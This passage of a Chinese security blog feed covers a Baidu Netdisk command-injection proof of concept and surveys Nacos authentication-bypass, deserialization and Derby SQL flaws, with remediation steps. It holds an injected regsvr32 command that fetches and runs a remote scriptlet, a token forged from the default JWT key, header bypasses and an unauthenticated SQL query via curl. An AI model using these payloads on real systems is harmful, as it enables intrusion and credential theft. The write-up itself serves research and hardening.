class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml">   &lt;![CDATA[    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe /c calc.exe&quot;);   ]]&gt; </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后去访问我们准备的，注意其中的127.0.0.1:8000你可以修改成你的远程vps地址，winter就是当前主机的用户命令，也要进行修改。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">https://127.0.0.1:10000/?method=OpenSafeBox&amp;uk=a%20-install<span class="hljs-variable">%20regdll%</span>20%22C:<span class="hljs-symbol">\\</span>\Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>scrobj.dll<span class="hljs-symbol">\%</span>22%20/u%20/i:http://127.0.0.1:8000/poc.xml%20<span class="hljs-symbol">\%</span>22<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>Users\winter\AppData\Roaming\baidu\BaiduNetdisk<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2023.34.47@2x.png" alt="CleanShot 2025-09-05 at 23.34.47@2x"></p><p>可以看到成功调用regsvr32.exe去下载poc.xml成功执行</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2023.47.05@2x.png" alt="CleanShot 2025-09-05 at 23.47.05@2x"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://mp.weixin.qq.com/s/9ixapjlMLrnqKRB9_W-ypw">https://mp.weixin.qq.com/s/9ixapjlMLrnqKRB9_W-ypw</a></p><p><a href="https://mrxn.net/news/baidupan-windows-client-rce.html">https://mrxn.net/news/baidupan-windows-client-rce.html</a></p>]]></content>
    
    
    <categories>
      
      <category>命令注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>百度网盘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nacos系列安全问题整理</title>
    <link href="/2025/09/04/Nacos%E7%B3%BB%E5%88%97%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/"/>
    <url>/2025/09/04/Nacos%E7%B3%BB%E5%88%97%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>写这篇文章的起源自HW期间遇到很多并且之前并未了解Nacos系列漏洞或者Nacos相关信息，故出生了这篇文章</p><p>其实关于Nacos安全问题的根本原因，正如官方的开发文档所说，Nacos提供简单的鉴权实现，即只提供防止业务错用的弱鉴权体系，而不是防止恶意攻击的强鉴权体系，正是导致这些安全问题的根本原因，不知道Nacos是否考虑后续改进一下，因为HW期间因此产生的安全问题已经比较影响正常业务了</p><p>事实证明，不安全的一直是人性，而不是其他东西</p><p><img src="https://img1.plumstar.cn/upload5image-20240910145433022.png"></p><h1 id="Nacos快速利用工具"><a href="#Nacos快速利用工具" class="headerlink" title="Nacos快速利用工具"></a>Nacos快速利用工具</h1><p>其实本来想放到最后面的，但是想到工作中检查类似漏洞肯定少不了工具，所以放在最前面比较合适，这里我就写俩，其实还是不少的</p><h2 id="HKEcho-Nacos"><a href="#HKEcho-Nacos" class="headerlink" title="HKEcho_Nacos"></a>HKEcho_Nacos</h2><p>作者：<strong>HKEcho@深蓝实验室天玄攻防战队</strong></p><p>项目地址：<a href="https://github.com/HKEcho5213/HKEcho_Nacos.git">https://github.com/HKEcho5213/HKEcho_Nacos.git</a></p><p>工具支持检测以下漏洞：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">0、未授权查看用户列表<br><br>以下漏洞顺序执行直到获取到一个账号：<br>1、检测nacos默认口令<br>2、任意用户添加<br>3、任意用户添加UA<span class="hljs-emphasis">_Bypass</span><br><span class="hljs-emphasis">4、任意用户添加末尾斜杠绕过</span><br><span class="hljs-emphasis">5、默认JWT任意用户添加</span><br><span class="hljs-emphasis">6、JWT_Secret_</span>Key硬编码绕过<br>7、Identity硬编码绕过<br>8、QVD-2023-6271身份认证绕过<br>一旦某个漏洞获取账号密码后，会调用a1phaboy师傅写的nacosleak读取配置文件<br><br>9、Nacos<span class="hljs-emphasis">_Jraft_Hessian反序列化漏洞</span><br><span class="hljs-emphasis">程序会调用c0olw师傅写的NacosRce打一遍Jraft_</span>Hessian反序列化漏洞（本工具在调用这个NacosRce工具前会判断Java环境，若不存在，则告警不执行<br></code></pre></td></tr></table></figure><p><strong>安装</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> -r requirements.txt<br></code></pre></td></tr></table></figure><p><strong>使用</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">HKEcho</span>_Nacos&gt;python <span class="hljs-title class_">HKEcho</span>_Nacos.py -h<br>* * * * * * * * * * * * * * * * * * * * * * * *<br>        ~~|<span class="hljs-params"></span>|<span class="hljs-title class_">HKEcho</span> <span class="hljs-title class_">Nacos</span>快速利用工具|<span class="hljs-params"></span>|~~<br>                【*】<span class="hljs-title class_">Author</span>：<span class="hljs-title class_">HKEcho</span><br><br>&lt;*哥斯拉内存马*&gt;<br>密码<span class="hljs-symbol">:pass/key</span><br>设置请求头<span class="hljs-symbol">:x-client-data</span><span class="hljs-symbol">:godzilla</span>;<br>设置<span class="hljs-title class_">Referer</span><span class="hljs-symbol">:https</span><span class="hljs-symbol">://www</span>.google.com/<br>* * * * * * * * * * * * * * * * * * * * * * * *<br><span class="hljs-symbol">usage:</span> <span class="hljs-title class_">HKEcho</span>_Nacos.py [-h] [-u <span class="hljs-variable constant_">URL</span>] [-f <span class="hljs-variable constant_">FILENAME</span>]<br><br>optional <span class="hljs-symbol">arguments:</span><br>  -h, --help   show this help message <span class="hljs-keyword">and</span> exit<br>  -u <span class="hljs-variable constant_">URL</span>       要检查漏洞的单个<span class="hljs-variable constant_">URL</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">8848</span><br>  -f <span class="hljs-variable constant_">FILENAME</span>  批量检测,包含<span class="hljs-variable constant_">URL</span>的文本文件<br></code></pre></td></tr></table></figure><p><strong>1、单个目标检测：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> HKEcho_Nacos.py -u http://<span class="hljs-number">192</span>.<span class="hljs-number">2</span>xx.<span class="hljs-number">2</span>xx.<span class="hljs-number">1</span>x:<span class="hljs-number">8848</span><br></code></pre></td></tr></table></figure><p><strong>2、批量目标检测：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python HKEcho_Nacos<span class="hljs-selector-class">.py</span> -f target<span class="hljs-selector-class">.txt</span> <span class="hljs-comment">//新建target.txt，一行放一个Nacos的URL</span><br></code></pre></td></tr></table></figure><p>其他的我就不做过多讲解了，项目作者在项目的readme已经说的比较详细了，可以直接区GitHub看，文章主要重点放在漏洞上</p><h2 id="NacosExploitGUI"><a href="#NacosExploitGUI" class="headerlink" title="NacosExploitGUI"></a>NacosExploitGUI</h2><p><a href="https://github.com/charonlight/NacosExploitGUI">https://github.com/charonlight/NacosExploitGUI</a></p><p>对于我这种工作期间需要基线排查的还是很方便快捷的</p><h1 id="权限绕过类"><a href="#权限绕过类" class="headerlink" title="权限绕过类"></a>权限绕过类</h1><p>除CVE-2021-29441，都是研发人员在代码中没有将以下鉴权功能配置正确导致的权限绕过</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 开启鉴权</span><br>nacos.core.auth.<span class="hljs-attribute">enabled</span>=<span class="hljs-literal">true</span><br>nacos.core.auth.system.<span class="hljs-attribute">type</span>=nacos<br><span class="hljs-comment"># 开启鉴权之后，你可以自定义用于生成JWT令牌的密钥  </span><br><span class="hljs-comment"># The default token(Base64 String)</span><br><span class="hljs-comment"># 自定义密钥时，推荐将配置项设置为Base64编码的字符串，且原始密钥长度不得低于32字符。  </span><br>nacos.core.auth.default.token.secret.key=<br><span class="hljs-comment"># 关闭使用user-agent判断服务端请求并放行鉴权的功能</span><br>nacos.core.auth.enable.<span class="hljs-attribute">userAgentAuthWhite</span>=<span class="hljs-literal">false</span><br><span class="hljs-comment"># 当以上两个属性这样如此设置时，以下两个属性生效</span><br><span class="hljs-comment"># 配置自定义身份识别的key（不可为空）和value（不可为空）</span><br><span class="hljs-comment"># 这两个属性是授权白名单，用于标识来自其他服务器的请求。</span><br>nacos.core.auth.server.identity.<span class="hljs-attribute">key</span>=nacosKey<br>nacos.core.auth.server.identity.<span class="hljs-attribute">value</span>=nacosValue<br></code></pre></td></tr></table></figure><h2 id="默认配置未授权访问漏洞"><a href="#默认配置未授权访问漏洞" class="headerlink" title="默认配置未授权访问漏洞"></a>默认配置未授权访问漏洞</h2><blockquote><p>成因：nacos.core.auth.enabled &#x3D; false</p></blockquote><p>此漏洞不需要添加任何身份标识来绕过校验，仅仅是因为默认配置未开启鉴权导致漏洞出现</p><p><em><strong>1.1 环境搭建</strong></em></p><p>Nacos gtihub下载地址</p><p><a href="https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1">https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1</a><br>win10环境搭建</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#进入nacos/bin下执行</span><br>startup.cmd -m standalone<br><span class="hljs-comment">#搭建成功后访问可看到nacos登陆界面</span><br>http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8848</span><span class="hljs-regexp">/nacos/i</span>ndex.html<span class="hljs-comment">#/login</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240910153248121.png"></p><p><em><strong>1.2 漏洞验证</strong></em></p><p>查看用户信息，两个url</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">8848</span>/nacos/v1/auth/users?pageNo=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">1</span><br><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">8848</span>/nacos/v1/auth/users?pageNo=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">1</span>&amp;search=accurate&amp;accessToken<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240910153557594.png"></p><p>新建用户</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/nacos/v1/auth/users?username=test1&amp;password=test</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240910155914156.png"></p><p>成功登陆</p><p><img src="https://img1.plumstar.cn/upload5image-20240910160119664.png"></p><p><em><strong>1.3 漏洞原理</strong></em></p><p>默认未开启配置 nacos.core.auth.enabled</p><p><img src="https://img1.plumstar.cn/upload5image-20240910161257773.png"></p><p>在auth&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;auth&#x2F;common&#x2F;AuthConfigs.java类中，isAuthEnabled方法的返回值取决于nacos.core.auth.enabled （默认False）</p><p><img src="https://img1.plumstar.cn/upload5image-20240910162711181.png"></p><p>在core&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;core&#x2F;auth&#x2F;AuthFilter.java类中，根据authConifgs.isAuthEnabled()的返回值默认为flase，所以这里默认跳过检查认证filter，直接进入filterchain的下一个filter</p><p><img src="https://img1.plumstar.cn/upload5image-20240910163105818.png"></p><p><em><strong>1.4 修复方案</strong></em></p><p>配置文件修改为：nacos.core.auth.enabled&#x3D;True</p><p>修改之后，再次尝试访问<a href="http://localhost:8848/nacos/v1/auth/users?pageNo=1&pageSize=1%EF%BC%8C%E5%9B%9E%E6%98%BEWhitelabelErrorPage">http://localhost:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1，回显WhitelabelErrorPage</a></p><p><img src="https://img1.plumstar.cn/upload5image-20240910164309168.png"></p><h2 id="默认jwt密钥未授权访问"><a href="#默认jwt密钥未授权访问" class="headerlink" title="默认jwt密钥未授权访问"></a>默认jwt密钥未授权访问</h2><p><em><strong>2.1 漏洞简介</strong></em></p><p>开启了nacos.core.auth.enabled 的情况下，如果未修改默认nacos.core.auth.default.token.secret.key，则可以生产accessToken值来绕过权限。</p><p>该key值固定，在nacos使用jwt构造认证token，使用HS256算法，把配置文件中nacos.core.auth.plugin.nacos.token.secret.key的默认值当作私钥生成Signature，将用户名和时间戳写到jwt token里，所以可以在登录时对accessToken进行伪造，从而实现访问认证绕过</p><p>影响版本：<strong>0.1.0 &lt;&#x3D; Nacos &lt;&#x3D; 2.2.0</strong></p><p>配置文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">### If turn on auth system:</span><br><span class="hljs-attr">nacos.core.auth.enabled</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-comment">### The default token:</span><br><span class="hljs-attr">nacos.core.auth.default.token.secret.key</span>=SecretKey012345678901234567890123456789012345678901234567890123456789<br></code></pre></td></tr></table></figure><p><em><strong>2.2 环境搭建</strong></em></p><p>Nacos gtihub下载地址</p><p><a href="https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1">https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1</a><br>win10环境搭建</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#进入nacos/bin下执行</span><br>startup.cmd -m standalone<br><br><span class="hljs-comment">#搭建成功后访问可看到nacos登陆界面</span><br>http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8848</span><span class="hljs-regexp">/nacos/i</span>ndex.html<span class="hljs-comment">#/login</span><br></code></pre></td></tr></table></figure><p><em><strong>2.3 漏洞验证</strong></em></p><p>将默认key拿到在线的jwt生成网站：<a href="https://jwt.io/">https://jwt.io/</a></p><p>以及生成一个比当前系统时间晚的unix时间戳，填到payload中，如图</p><p>例如我现在系统时间为2024-09-10，所以我填2024-09-11，比系统时间晚就可以</p><p><img src="https://img1.plumstar.cn/upload5image-20240910195125365.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20240910195101909.png"></p><p>拿到我们构造的accessToken</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiJ<span class="hljs-number">9</span>.eyJzdWIiOiJuYWNvcyIsImV<span class="hljs-number">4</span>cCI<span class="hljs-number">6</span>IjE<span class="hljs-number">3</span>MjYwNTUzMDAifQ.<span class="hljs-number">6</span>eDNR<span class="hljs-number">9</span>V<span class="hljs-number">3</span><span class="hljs-keyword">x</span><span class="hljs-number">7</span>_H<span class="hljs-number">4</span>bGIsGejg<span class="hljs-number">7</span>TGc-K<span class="hljs-number">8</span>pWaHLE<span class="hljs-number">8</span>GIHqi<span class="hljs-number">5</span><span class="hljs-keyword">gc</span><br></code></pre></td></tr></table></figure><p>然后带上我们构造的token即可访问，因为将nacos.core.auth.enabled&#x3D;true打开后，默认只有token验证通过的用户才能访问该页面和添加新用户，甚至可以不需要添加用户直接登陆进去</p><p><img src="https://img1.plumstar.cn/upload5image-20240910195406580.png"></p><p>可以看到返回200，证明登陆成功了，添加用户也是跟上面一样的操作，只不过加个我们伪造的acessToken就好。</p><p><img src="https://img1.plumstar.cn/upload5image-20240910195631265.png"></p><p><em><strong>2.4 漏洞原理</strong></em></p><p><img src="https://img1.plumstar.cn/upload5image-20240910200921178.png"></p><p><em><strong>2.5 修复方案</strong></em></p><p>修改默认的nacos.core.auth.default.token.secret.key</p><h2 id="身份认证serverIdentity绕过"><a href="#身份认证serverIdentity绕过" class="headerlink" title="身份认证serverIdentity绕过"></a>身份认证serverIdentity绕过</h2><p><em><strong>3.1 漏洞简介</strong></em></p><p>更合适的说法是危险配置造成的鉴权不严，其实也算是弱口令，因为</p><p><em><strong>3.2 环境搭建</strong></em></p><p>配置如下的时候就会造成这个绕过可用，1.4.1版本复现成功，2.0.0版本复现失败，因为有几个配置并未存在</p><p><img src="https://img1.plumstar.cn/upload5image-20240911142034731.png"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">### 版本为1.4.1</span><br><span class="hljs-comment">### If turn on auth system:</span><br><span class="hljs-attr">nacos.core.auth.enabled</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-comment">### Since 1.4.1, Turn on/off white auth for user-agent: nacos-server, only for upgrade from old version.</span><br><span class="hljs-attr">nacos.core.auth.enable.userAgentAuthWhite</span>=<span class="hljs-literal">false</span> //原配置默认为<span class="hljs-literal">true</span><br><br><span class="hljs-comment">### Since 1.4.1, worked when nacos.core.auth.enabled=true and nacos.core.auth.enable.userAgentAuthWhite=false.</span><br><span class="hljs-comment">### The two properties is the white list for auth and used by identity the request from other server.</span><br><span class="hljs-attr">nacos.core.auth.server.identity.key</span>=serverIdentity //原配置这里默认为空<br><span class="hljs-attr">nacos.core.auth.server.identity.value</span>=security //原配置默认为空<br><br><span class="hljs-comment">### The default token (Base64 String) and len(key)&gt;32:关于这一段，我看好多师傅都写上了，但是我实际测试的时候发现1.4.1版本并未有这个默认配置而且我并没有加只是修改了上方四个配置就可以复现成功</span><br><span class="hljs-attr">nacos.core.auth.plugin.nacos.token.secret.key</span>=MTIzNDU2Nzg5MTIzMTI0MzIxNDM2NTRmYmRmMzI0c2R2c2Rh<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240911141217760.png"></p><p><em><strong>3.3 漏洞验证</strong></em></p><p>在请求头中serverIdentity:security即可绕过jwt鉴权，未加则请求失败</p><p><img src="https://img1.plumstar.cn/upload5image-20240911141638210.png"></p><p><em><strong>3.4 漏洞原理</strong></em></p><p>首先逻辑是根据前面的分析判断是否开启nacos.core.auth.enabled和是否开启userAgentAuthWhite，然后是对配置文件是否配置了identity.key&amp;identity.value，若配置了则检测与配置文件是否相同，相同则允许通过。</p><p><em><strong>3.5 漏洞修复</strong></em></p><p>identity.key&amp;identity.value的值其实是自定义的，这个安全隐患更像弱口令，建议直接更新版本。</p><h2 id="Nacos请求头User-Agent绕过鉴权"><a href="#Nacos请求头User-Agent绕过鉴权" class="headerlink" title="Nacos请求头User-Agent绕过鉴权"></a>Nacos请求头User-Agent绕过鉴权</h2><p><em><strong>4.1 漏洞简介</strong></em></p><p>漏洞编号：CVE-2021-29441</p><p>在Nacos的鉴权管理中，有一项配置是通过User-Agent中是否包含Nacos-Server来进行判断请求是否来自其他服务端。</p><p>配置文件中<code>nacos.core.auth.enable.userAgentAuthWhite = true</code>，就会获取请求头中UserAgent的值，然后判断是否是以字符串<code>Nacos-Server</code>为开头，若是则直接跳过鉴权。</p><p><strong>影响版本</strong>：Nacos &lt;&#x3D; 2.0.0-ALPHA.1</p><p><em><strong>4.2 环境搭建</strong></em></p><p>版本选择低于2.00即可，另外这个漏洞vulhub也有，也可以一键化部署，我这里是vulhub的，自己动手的话建议1.4.1，因为2.0.0我没试过</p><p>配置文件如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">nacos.core.auth.enable.userAgentAuthWhite</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240911115820037.png"></p><p><em><strong>4.3 漏洞验证</strong></em></p><p>加UA后成功绕过鉴权，不加UA失败</p><p><img src="https://img1.plumstar.cn/upload5image-20240911125025223.png"></p><p><em><strong>4.4 漏洞原理</strong></em></p><p>相关代码文件是core&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;core&#x2F;auth&#x2F;AuthFilter.java<br>这里的逻辑也很简单，如果authConfigs.isEnableUserAgentAuthWhite()即配置文件中 nacos.core.auth.enable.userAgentAuthWhite 为true，就会获取请求头中UserAgent的值，然后判断是否是以字符串“Nacos-Server”为开头，若是则直接跳过鉴权。<br>StringUtils.startsWith(userAgent, Constants.NACOS_SERVER_HEADER)</p><p><img src="https://img1.plumstar.cn/upload5image-20240911143925510.png"></p><p><em><strong>4.5 漏洞修复</strong></em></p><p>更改配置文件中默认选项</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">nacos.core.auth.enable.userAgentAuthWhite</span>=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h2 id="对User-Agent绕过鉴权的bypass"><a href="#对User-Agent绕过鉴权的bypass" class="headerlink" title="对User-Agent绕过鉴权的bypass"></a>对User-Agent绕过鉴权的bypass</h2><p>是对上一个user-agent的bypass，官方修复了之后三梦师傅又发现了另一种方法，可以绕过修复</p><p>不过开发者直接删除了漏洞版本的1.4.1（三梦师傅是Jan 14 提的issue，然后封装好的server端是直接更换修复后的了，不过Source code没有换），而低版本中没有对应配置项。所以想要复现试试的可以通过源码编译的方式获取环境，我这里就不详细写了，感觉三梦师傅和谢师傅写的已经很易懂了，我这种菜鸟都能看懂，感兴趣的移步两位师傅文章</p><p><a href="https://xz.aliyun.com/t/15151?time__1311=GqjxuQD=cDlx0nD2DUxYwrIDcmYwhjox#toc-5">https://xz.aliyun.com/t/15151?time__1311=GqjxuQD%3DcDlx0nD2DUxYwrIDcmYwhjox#toc-5</a></p><p><a href="https://github.com/alibaba/nacos/issues/4701">https://github.com/alibaba/nacos/issues/4701</a></p><p>其实是我比较懒hhh</p><h1 id="Nacos-Jraft-Hessian-反序列化漏洞"><a href="#Nacos-Jraft-Hessian-反序列化漏洞" class="headerlink" title="Nacos Jraft Hessian 反序列化漏洞"></a>Nacos Jraft Hessian 反序列化漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><em>漏洞描述</em></h2><p>Nacos默认的7848端口是用来处理集群模式下raft协议的通信，该端口的服务在处理部分jraft请求的时候使用hessian传输协议进行反序列化过滤不严，导致RCE。</p><p>**漏洞编号：**CNVD-2023-45001</p><p><strong>影响版本</strong>:</p><ul><li>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6（使用cluster集群模式运行）</li><li>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3（任意模式运行）</li></ul><p>搭建环境，docker一键部署2.0.0</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull nacos/nacos-server:<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> # 拉取<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>版本的nacos<br><span class="hljs-attribute">docker</span> run --name nacos -d -p <span class="hljs-number">8848</span>:<span class="hljs-number">8848</span> -p <span class="hljs-number">7848</span>:<span class="hljs-number">7848</span> -e MODE=standalone nacos/nacos-server:<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a><em>漏洞检测</em></h2><p>建议直接工具梭哈，方便快捷，具体食用教程看作者文档就好</p><p><a href="https://github.com/c0olw/NacosRce">https://github.com/c0olw/NacosRce</a></p><p><img src="https://img1.plumstar.cn/upload5image-20240911183407539.png"></p><p>内存马打进去了，冰蝎哥斯拉什么的去连也是可以的，这里就不多写了</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><em>漏洞原理</em></h2><p>关于原理，这篇文章暂时不写，以后会不会出，不太确定，字数有点多，大家可以先看<strong>p1g3</strong>师傅的文章学习</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://exp.ci/<span class="hljs-number">2023</span>/<span class="hljs-number">06</span>/<span class="hljs-number">14</span>/Nacos-JRaft-Hessian-反序列化分析/<br></code></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a><em>漏洞修复</em></h2><p>目前，官方已发布新版本修复了该漏洞，请受影响的用户升级到安全版本：</p><p><a href="https://github.com/alibaba/nacos/releases/tag/1.4.6">https://github.com/alibaba/nacos/releases/tag/1.4.6</a></p><p><a href="https://github.com/alibaba/nacos/releases/tag/2.2.3">https://github.com/alibaba/nacos/releases/tag/2.2.3</a></p><p><strong>临时缓解措施：</strong></p><p>该漏洞仅影响7848端口（默认设置下），该端口是Nacos集群间Raft协议的通信端口，不承载客户端请求，如果受影响的用户无法及时升级，可通过禁止该端口的请求来缓解此漏洞。</p><h1 id="Derby未授权-SQL注入"><a href="#Derby未授权-SQL注入" class="headerlink" title="Derby未授权-&gt;SQL注入"></a>Derby未授权-&gt;SQL注入</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a><em>漏洞简介</em></h2><p>nacos带有一个嵌入式的小型数据库derby，而在版本&lt;&#x3D;1.4.0的默认配置部署nacos的情况下，它无需认证即可被访问，并执行任意sql查询，导致敏感信息泄露，而CVE-2021-29442是因为最开始开发者没有为这个内存型数据库接口配置任何的访问控制引发的。</p><p><strong>影响版本</strong>：Nacos &lt;&#x3D; 1.4.0；漏洞编号：CVE-2021-29442</p><p>漏洞环境用1.4.0进行测试，也可以用vulhub搭建好像，大家可以试试</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a><em>漏洞验证</em></h2><p>手工验证：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -XGET <span class="hljs-string">&quot;http://192.168.92.1:8848/nacos/v1/cs/ops/derby?sql=select<span class="hljs-variable">%20</span>*<span class="hljs-variable">%2</span>0from<span class="hljs-variable">%2</span>0users<span class="hljs-variable">%20</span>&quot;</span><br></code></pre></td></tr></table></figure><p>当然也可以发数据包试试，sql语句为：<code>select * from users</code>，其他注入语句也是一样的</p><p><img src="https://img1.plumstar.cn/upload5image-20240911151413140.png"></p><p>进阶利用是可以直接用下方的代码来破解此处查出来的用户密码的，毕竟加密方式是公开的</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 